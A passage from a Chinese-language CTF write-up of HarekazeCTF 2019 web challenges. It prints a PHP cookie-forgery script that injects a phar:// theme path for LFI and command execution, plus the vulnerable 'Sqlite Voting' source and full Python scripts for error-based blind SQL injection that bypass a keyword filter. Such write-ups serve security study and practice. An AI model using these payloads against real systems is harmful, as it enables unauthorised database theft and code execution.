<p>（3）再次访问upload.php，因为没有上传文件，触发了错误信息，产生了一个包含错误信息的cookie：</p>
<p><img src="../../../../img/hkctf/199.png" alt=""></p>
<p>此时可以本地解码一下看看data字段：</p>
<p><img src="../../../../img/hkctf/200.png" alt=""></p>
<p>很明显已经超过了72个字符，我们只需要在末尾部分添加上<strong>theme</strong>字段即可</p>
<p>（4）编写exp：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">urlsafe_base64_encode</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> rtrim(str_replace([<span class="string">'+'</span>, <span class="string">'/'</span>], [<span class="string">'-'</span>, <span class="string">'_'</span>], base64_encode($data)), <span class="string">'='</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">urlsafe_base64_decode</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> base64_decode(str_replace([<span class="string">'-'</span>, <span class="string">'_'</span>], [<span class="string">'+'</span>, <span class="string">'/'</span>], $data) . str_repeat(<span class="string">'='</span>, <span class="number">3</span> - (<span class="number">3</span> + strlen($data)) % <span class="number">4</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$cookie = <span class="string">"eyJuYW1lIjoic29tbnVzIiwiYXZhdGFyIjoiYWZkOTAyYTgucG5nIiwiZmxhc2giOnsidHlwZSI6ImVycm9yIiwibWVzc2FnZSI6Ik5vIGZpbGUgd2FzIHVwbG9hZGVkLiJ9fQ.JDJ5JDEwJFRIOVphUElWTk5Hb0RBSFlSd1BFa3UyRFJBMmU0STZmZE9rNFlReDcvY0xYZTRrR1ZxbjVx"</span>;</span><br><span class="line"><span class="keyword">list</span>($data, $signature) = explode(<span class="string">'.'</span>, $cookie);</span><br><span class="line">$data = urlsafe_base64_decode($data);</span><br><span class="line">var_dump($data);</span><br><span class="line">$json = json_decode($data,<span class="keyword">true</span>);</span><br><span class="line">var_dump($json[<span class="string">'avatar'</span>]);</span><br><span class="line">$avatar = $json[<span class="string">'avatar'</span>];</span><br><span class="line">$data = str_replace(<span class="string">'&#125;&#125;'</span>,<span class="string">'&#125;,"theme":"phar://uploads/'</span>.$avatar.<span class="string">'/exp"&#125;'</span>,$data);</span><br><span class="line">var_dump($data);</span><br><span class="line">$data = urlsafe_base64_encode($data);</span><br><span class="line">$cookie = $data . <span class="string">'.'</span>. $signature;</span><br><span class="line">var_dump($cookie);</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/hkctf/201.png" alt=""></p>
<p>运行后生成payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJuYW1lIjoic29tbnVzIiwiYXZhdGFyIjoiYWZkOTAyYTgucG5nIiwiZmxhc2giOnsidHlwZSI6ImVycm9yIiwibWVzc2FnZSI6Ik5vIGZpbGUgd2FzIHVwbG9hZGVkLiJ9LCJ0aGVtZSI6InBoYXI6Ly91cGxvYWRzL2FmZDkwMmE4LnBuZy9leHAifQ.JDJ5JDEwJFRIOVphUElWTk5Hb0RBSFlSd1BFa3UyRFJBMmU0STZmZE9rNFlReDcvY0xYZTRrR1ZxbjVx</span><br></pre></td></tr></table></figure>

<p>（5）最后再以生成的payload作为session去访问<strong>index.php</strong>，触发LFI，执行命令：</p>
<p><img src="../../../../img/hkctf/202.png" alt=""></p>
<p>（6）读取根目录下的flag文件：</p>
<p><img src="../../../../img/hkctf/203.png" alt=""></p>
<h3 id="Sqlite-Voting"><a href="#Sqlite-Voting" class="headerlink" title="Sqlite Voting"></a>Sqlite Voting</h3><p>题目源码：</p>
<p><strong>vote.php</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>])) &#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">  $banword = [</span><br><span class="line">    <span class="comment">// dangerous chars</span></span><br><span class="line">    <span class="comment">// " % ' * + / &lt; = &gt; \ _ ` ~ -</span></span><br><span class="line">    <span class="string">"[\"%'*+\\/&lt;=&gt;\\\\_`~-]"</span>,</span><br><span class="line">    <span class="comment">// whitespace chars</span></span><br><span class="line">    <span class="string">'\s'</span>,</span><br><span class="line">    <span class="comment">// dangerous functions</span></span><br><span class="line">    <span class="string">'blob'</span>, <span class="string">'load_extension'</span>, <span class="string">'char'</span>, <span class="string">'unicode'</span>,</span><br><span class="line">    <span class="string">'(in|sub)str'</span>, <span class="string">'[lr]trim'</span>, <span class="string">'like'</span>, <span class="string">'glob'</span>, <span class="string">'match'</span>, <span class="string">'regexp'</span>,</span><br><span class="line">    <span class="string">'in'</span>, <span class="string">'limit'</span>, <span class="string">'order'</span>, <span class="string">'union'</span>, <span class="string">'join'</span></span><br><span class="line">  ];</span><br><span class="line">  $regexp = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $banword) . <span class="string">'/i'</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match($regexp, $str)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">"Content-Type: text/json; charset=utf-8"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// check user input</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'id'</span>]) || <span class="keyword">empty</span>($_POST[<span class="string">'id'</span>])) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">'error'</span> =&gt; <span class="string">'You must specify vote id'</span>]));</span><br><span class="line">&#125;</span><br><span class="line">$id = $_POST[<span class="string">'id'</span>];</span><br><span class="line"><span class="keyword">if</span> (!is_valid($id)) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">'error'</span> =&gt; <span class="string">'Vote id contains dangerous chars'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// update database</span></span><br><span class="line">$pdo = <span class="keyword">new</span> PDO(<span class="string">'sqlite:../db/vote.db'</span>);</span><br><span class="line">$res = $pdo-&gt;query(<span class="string">"UPDATE vote SET count = count + 1 WHERE id = $&#123;id&#125;"</span>);</span><br><span class="line"><span class="keyword">if</span> ($res === <span class="keyword">false</span>) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">'error'</span> =&gt; <span class="string">'An error occurred while updating database'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// succeeded!</span></span><br><span class="line"><span class="keyword">echo</span> json_encode([</span><br><span class="line">  <span class="string">'message'</span> =&gt; <span class="string">'Thank you for your vote! The result will be published after the CTF finished.'</span></span><br><span class="line">]);</span><br></pre></td></tr></table></figure>

<p><strong>schema.sql</strong>：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="string">`vote`</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`vote`</span> (</span><br><span class="line">  <span class="string">`id`</span> <span class="built_in">INTEGER</span> PRIMARY <span class="keyword">KEY</span> AUTOINCREMENT,</span><br><span class="line">  <span class="string">`name`</span> <span class="built_in">TEXT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`count`</span> <span class="built_in">INTEGER</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`vote`</span> (<span class="string">`name`</span>, <span class="string">`count`</span>) <span class="keyword">VALUES</span></span><br><span class="line">  (<span class="string">'dog'</span>, <span class="number">0</span>),</span><br><span class="line">  (<span class="string">'cat'</span>, <span class="number">0</span>),</span><br><span class="line">  (<span class="string">'zebra'</span>, <span class="number">0</span>),</span><br><span class="line">  (<span class="string">'koala'</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="string">`flag`</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`flag`</span> (</span><br><span class="line">  <span class="string">`flag`</span> <span class="built_in">TEXT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`flag`</span> <span class="keyword">VALUES</span> (<span class="string">'HarekazeCTF&#123;&lt;redacted&gt;&#125;'</span>);</span><br></pre></td></tr></table></figure>

<p>一道<strong>update</strong>的<strong>sqlite</strong>注入题，看到<strong>update</strong>很自然想起了<strong>盲注</strong>，但是，注意到关键代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($res === <span class="keyword">false</span>) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">'error'</span> =&gt; <span class="string">'An error occurred while updating database'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> json_encode([</span><br><span class="line">  <span class="string">'message'</span> =&gt; <span class="string">'Thank you for your vote! The result will be published after the CTF finished.'</span></span><br><span class="line">]);</span><br></pre></td></tr></table></figure>

<p>当查询结果为false（即产生<strong>语法错误</strong>时，返回信息<strong>An error occurred while updating database</strong>）</p>
<p>然而不管有没有更新成功，都会返回同样的信息</p>
<p>这样的代码，很显然就告诉了我们要用一种<strong>基于语法错误的盲注</strong></p>
<p>然后整理一下过滤点：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;%&apos;*+\/&lt;=&gt;\\_`~-]|\s|blob|load_extension|char|unicode|(in|sub)str|[lr]trim|like|glob|match|regexp|in|limit|order|union|join</span><br></pre></td></tr></table></figure>

<p>过滤了<strong>空格\s</strong>，<strong>+</strong>，<strong>/</strong>，<strong>***，</strong>=<strong>，</strong>&gt;<strong>，</strong>&lt;**等关键字</p>
<h4 id="（1）寻找报错点"><a href="#（1）寻找报错点" class="headerlink" title="（1）寻找报错点"></a>（1）寻找报错点</h4><p>既然是基于语法报错，我们首先就需要找到能引起报错的语句，之前国赛有个<code>pow(9999,100)</code>，但是这里是<strong>sqlite3</strong>数据库，不支持pow函数。除此之外还有个<strong>整数溢出</strong>引起的报错：<code>abs(-9223372036854775808)</code></p>
<p><img src="../../../../img/hkctf/205.png" alt=""></p>
<p>不过这里因为减号<code>-</code>被过滤了，因此转换为十六进制<strong>0x8000000000000000</strong></p>
<h4 id="（2）构造条件语句"><a href="#（2）构造条件语句" class="headerlink" title="（2）构造条件语句"></a>（2）构造条件语句</h4><p>报错信息有了，接下来就是构造<strong>条件语句</strong>，sqlite不支持<strong>if</strong>语句，但是支持<code>case when</code>语句</p>
<p>于是我们可以构造：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abs(case(判断语句)when(0)then(0)else(0x8000000000000000)end)</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/hkctf/206.png" alt=""></p>
<p>下面就是构造<strong>判断语句</strong>了，因为判断符号（= &lt; &gt; !）都遭到了过滤，而且引号<code>&#39;</code>和<code>&quot;</code>过滤，<strong>substr</strong>字符串截取函数过滤，导致我们无法用字符做判断语句。既然无法截取字符，那我们可以考虑使用 <code>hex</code> 进行字符的判断，这样的好处是将所有的的字符串组合用有限的 <strong>16</strong> 个字符表示 </p>
<h4 id="（3）盲注长度"><a href="#（3）盲注长度" class="headerlink" title="（3）盲注长度"></a>（3）盲注长度</h4><p>先考虑对flag 16进制长度的判断，长度为整数，假设是<strong>18</strong>，那么转换为二进制后就是<strong>10010</strong>，然后与一个2的n次方数<code>1&lt;&lt;n</code>分别做<strong>按位与</strong><code>&amp;</code>运算</p>
<p><img src="../../../../img/hkctf/207.png" alt=""></p>
<p>可以发现，当<strong>18</strong>对应二进制位上的数为1时，和<code>1&lt;&lt;n</code>进行按位与运算后就能得到<code>1&lt;&lt;n</code></p>
<p>我们就可以利用这个条件构造如下的条件语句：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">length(hex((select(flag)from(flag))))&amp;(1&lt;&lt;n)</span><br></pre></td></tr></table></figure>

<p>拼接到<strong>case</strong>后构成payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abs(case(length(hex((select(flag)from(flag))))&amp;(1&lt;&lt;n))when(0)then(0)else(0x8000000000000000)end)</span><br></pre></td></tr></table></figure>

<p>盲注长度的exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://416bab78-3351-42cb-b5d7-53579e8dbea4.node3.buuoj.cn/vote.php"</span></span><br><span class="line">length = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    payload = <span class="string">"abs(case(length(hex((select(flag)from(flag))))&amp;%d)when(0)then(0)else(0x8000000000000000)end)"</span>%(<span class="number">1</span>&lt;&lt;i)</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">"id"</span>:payload</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url,data=data)</span><br><span class="line">    <span class="keyword">print</span> r.text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"An error"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        length = length | (<span class="number">1</span>&lt;&lt;i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> length</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/hkctf/208.png" alt=""></p>
<p>运行后得到flag的十六进制长度为：<strong>84</strong></p>
<h4 id="（4）盲注flag"><a href="#（4）盲注flag" class="headerlink" title="（4）盲注flag"></a>（4）盲注flag</h4><p>为什么得到长度呢，我们目前已经被限制了截取字符串的操作，所以能操作的只有整串的十六进制表示的flag，对整串字符串的利用函数，有个<code>replace</code>，我们知道<code>replace</code>函数可以对字符串里的某些字符进行替换，既然替换了，长度就会发生变化，那么，我们就可以利用这个条件进行盲注</p>
<p>例如我们已知的flag开头为<code>flag{</code>，转化为十六进制为：<code>666C61677B</code></p>
<p>那么，现在我们要开始对<code>flag{</code>后面的十六进制字符进行逐个盲注，先假设为<code>7</code>，我们对其进行<code>replace</code>函数的替换：</p>
<p><img src="../../../../img/hkctf/209.png" alt=""></p>
<p>可以看到，当我们正确注出<code>flag{</code>后的第一个字符时，经过<code>replace</code>函数的替换后，长度就比原来减少了</p>
<p>再用一次<code>replace</code>替换长度数，如果长度未发生变化，则返回原来的长度，反之则返回<strong>空</strong></p>
<p><img src="../../../../img/hkctf/210.png" alt=""></p>
<p>根据上面分析构造如下条件语句：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">replace(length(replace(hex((select(flag)from(flag))),替换的字符串,&apos;&apos;)),84,&apos;&apos;)</span><br></pre></td></tr></table></figure>

<p>但是，因为引号被过滤，我们得想其他方法构造<strong>空字符</strong>和<strong>字符串</strong></p>
<p>（1）空字符：<code>trim(0,0)</code></p>
<p>（2）字符串：<code>6|6</code></p>
<p>（3）ABCDEF构造：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># hex(b&apos;zebra&apos;) = 7A65627261</span><br><span class="line">  # 除去 12567 就是 A ，其余同理</span><br><span class="line">  A = &apos;trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)&apos;</span><br><span class="line"></span><br><span class="line">  C = &apos;trim(hex(typeof(.1)),12567)&apos;</span><br><span class="line"></span><br><span class="line">  D = &apos;trim(hex(0xffffffffffffffff),123)&apos;</span><br><span class="line"></span><br><span class="line">  E = &apos;trim(hex(0.1),1230)&apos;</span><br><span class="line"></span><br><span class="line">  F = &apos;trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)&apos;</span><br><span class="line"></span><br><span class="line">  # hex(b&apos;koala&apos;) = 6B6F616C61</span><br><span class="line">  # 除去 16CF 就是 B</span><br><span class="line">  B = f&apos;trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||&#123;C&#125;||&#123;F&#125;)&apos;</span><br></pre></td></tr></table></figure>

<p>最后的payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abs(case(replace(length(replace(hex((select(flag)from(flag))),替换的字符串,trim(0,0))),length,trim(0,0)))when(trim(0,0))then(0)else(0x8000000000000000)end)</span><br></pre></td></tr></table></figure>

<p>最后的exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://1968f105-b7cf-4ce2-8285-b717c3f8af04.node3.buuoj.cn/vote.php"</span></span><br><span class="line">length = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    payload = <span class="string">"abs(case(length(hex((select(flag)from(flag))))&amp;%d)when(0)then(0)else(0x8000000000000000)end)"</span>%(<span class="number">1</span>&lt;&lt;i)</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">"id"</span>:payload</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url,data=data)</span><br><span class="line">    <span class="keyword">print</span> r.text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"An error"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        length = length | (<span class="number">1</span>&lt;&lt;i)</span><br><span class="line"><span class="keyword">print</span> length</span><br><span class="line"></span><br><span class="line">length = <span class="number">84</span></span><br><span class="line">table = &#123;&#125;</span><br><span class="line">table[<span class="string">'A'</span>] = <span class="string">'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)'</span></span><br><span class="line">table[<span class="string">'C'</span>] = <span class="string">'trim(hex(typeof(.1)),12567)'</span></span><br><span class="line">table[<span class="string">'D'</span>] = <span class="string">'trim(hex(0xffffffffffffffff),123)'</span></span><br><span class="line">table[<span class="string">'E'</span>] = <span class="string">'trim(hex(0.1),1230)'</span></span><br><span class="line">table[<span class="string">'F'</span>] = <span class="string">'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)'</span></span><br><span class="line">table[<span class="string">'B'</span>] = <span class="string">'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||'</span> + table[<span class="string">"C"</span>] + <span class="string">'||'</span> + table[<span class="string">"F"</span>] +<span class="string">')'</span></span><br><span class="line"></span><br><span class="line">res = <span class="string">'flag&#123;'</span>.encode(<span class="string">'hex'</span>).upper()</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">in</span> <span class="string">"0123456789"</span>:</span><br><span class="line">        flag = flag + i + <span class="string">"||"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag = flag + table[i] + <span class="string">"||"</span></span><br><span class="line">flag = flag[:<span class="number">-2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(res),length):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">'0123456789ABCDEF'</span>:</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> <span class="string">'0123456789'</span>:</span><br><span class="line">            t = flag + <span class="string">"||"</span> + x</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            t = flag + <span class="string">"||"</span> + table[x]</span><br><span class="line">        payload = <span class="string">"abs(case(replace(length(replace(hex((select(flag)from(flag))),"</span>+t+<span class="string">",trim(0,0))),84,trim(0,0)))when(trim(0,0))then(0)else(0x8000000000000000)end)"</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"id"</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">print</span> r.text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"An error"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            res = res + x</span><br><span class="line">            <span class="keyword">print</span> res</span><br><span class="line">            flag = t</span><br><span class="line"><span class="keyword">print</span> res</span><br><span class="line"><span class="keyword">print</span> res.decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/hkctf/211.png" alt=""></p>
<p>总结思路：</p>
<p>过滤了引号，字符串截取函数，比较符号，空格。采用十六进制表示flag，将字符范围缩小至16个字符：<code>0123456789ABCDEF</code></p>
<p>（1）基于<strong>语法报错</strong>的sqlite注入：使用<code>abs(-9223372036854775808)</code>产生语法报错</p>
<p>（2）构造判断条件语句：<code>abs(case(条件语句)when(0)then(0)else(0x8000000000000000)end)</code></p>
<p>（3）使用<code>replace</code>函数进行flag逐一替换，替换成功，则长度变化，替换不成功，则长度不变。根据这个来产生条件语句。</p>
<p>（4）使用位与<code>&amp;</code>运算来得到十六进制的flag长度，当长度和一个2的n次方数<code>1&lt;&lt;n</code>位与后如果结果为1，代表长度二进制的对应位为1，反之为0</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://xz.aliyun.com/t/6628" target="_blank" rel="noopener">https://xz.aliyun.com/t/6628</a> </p>
<p><a href="https://st98.github.io/diary/posts/2019-05-21-harekaze-ctf-2019.html" target="_blank" rel="noopener">https://st98.github.io/diary/posts/2019-05-21-harekaze-ctf-2019.html</a> </p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined" target="_blank" rel="noopener">Somnus</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://nikoeurus.github.io/2019/11/07/HarekazeCTF2019-Web/">https://nikoeurus.github.io/2019/11/07/HarekazeCTF2019-Web/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://Nikoeurus.github.io">Somnus's blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Harekaze-ctf/">Harekaze ctf</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2019/11/10/2019%E6%B9%96%E6%B9%98%E6%9D%AFwp/"><i class="fa fa-chevron-left">  </i><span>2019 湖湘杯Web部分题解WriteUp</span></a></div><div class="next-post pull-right"><a href="/2019/11/06/XXE%E6%80%BB%E7%BB%93/"><span>XXE总结笔记</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'true' == true ? true : false;
var verify = 'false' == true ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'piszMlsB7MhecwDRlz0IFCop-gzGzoHsz',
  appKey:'PHmvwpbyTPCcD3D52L1CoTlp',
  placeholder:'Just go go',
  avatar:'wavatar',
  guest_info:guest_info,
  pageSize:'10',
  lang: 'zh-cn'
})</script></div></div><footer class="footer-bg" style="background-image: url(/img/background.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2018 - 2019 By Somnus</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script 